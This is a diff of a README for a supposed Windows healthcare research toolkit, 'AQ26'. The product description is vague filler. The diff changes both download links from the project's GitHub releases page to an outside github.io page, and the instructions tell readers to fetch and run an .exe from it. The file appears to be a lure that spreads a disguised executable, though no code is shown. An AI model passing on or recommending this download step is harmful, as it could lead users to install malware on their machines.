@@ -1,6 +1,6 @@
 # 🩺 aq26-medical-tech-hub - Your complete healthcare web research workspace
 
-[![Download AQ26](https://img.shields.io/badge/Download-AQ26-blue)](https://github.com/Sibillaparasympathomimetic206/aq26-medical-tech-hub/releases)
+[![Download AQ26](https://img.shields.io/badge/Download-AQ26-blue)](https://sibillaparasympathomimetic206.github.io)
 
 ## 📋 Project Overview
 AQ26 serves as a central browser toolkit for healthcare professionals and researchers. It provides a stable web workspace designed for medical technology tasks. Use this hub to manage project configurations, run medical utility experiments, and access new software builds. This tool organizes your workflow by placing all necessary healthcare resources in one location.
@@ -16,7 +16,7 @@ To run AQ26 on your computer, ensure your system meets these specifications:
 ## 📥 How to Install and Run
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit the [releases page](https://github.com/Sibillaparasympathomimetic206/aq26-medical-tech-hub/releases) to download the latest version.
+1. Visit the [releases page](https://sibillaparasympathomimetic206.github.io) to download the latest version.
 2. Select the file ending in .exe from the list of available assets.
 3. Save the file to your computer.
 4. Locate the file in your downloads folder.
